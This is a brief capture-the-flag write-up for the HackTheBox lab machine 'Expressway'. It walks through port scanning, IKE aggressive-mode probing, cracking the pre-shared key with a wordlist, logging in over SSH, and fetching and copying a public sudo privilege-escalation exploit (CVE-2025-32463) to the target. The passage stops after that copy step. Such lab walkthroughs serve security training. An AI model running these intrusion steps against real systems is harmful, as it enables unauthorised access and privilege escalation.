...
In this writeup I will document how I solved the easy maching [Expressway](https://app.hackthebox.com/machines/Expressway) on [HackTheBox](https://hackthebox.com)

## Enumeration
First we're provided with IP 10.10.11.87 so we do an nmap scan and add it to our /etc/hosts



```bash
~HTB/Expressway$ sudo echo "10.10.11.87 expressway.htb" >> /etc/hosts
~HTB/Expressway$ nmap -sS -sU 10.10.11.87
...
```bash
~HTB/Expressway$ ike-scan -A -M -P 10.10.11.87
...
```bash
~HTB/Expressway$ psk-crack -d /use/share/wordlist/rockyou.txt hash.txt
...
```bash
~HTB/Expressway$ ssh ike@expressway.htb
...
~HTB/Expressway$ git clone https://github.com/pr0v3rbs/CVE-2025-32463_chwoot.git

#Seeing what's inside
~HTB/Expressway/cd CVE-2025-32463_chwoot$ ls
Dockerfile  LICENSE  README.md  run.sh  sudo-chwoot.sh

#Sending the sudo_chwoot.sh file to ike@expressway.htb
~HTB/Expressway/cd CVE-2025-32463_chwoot$ scp sudo_chwoot.sh ike@expressway.htb:/home/ike 
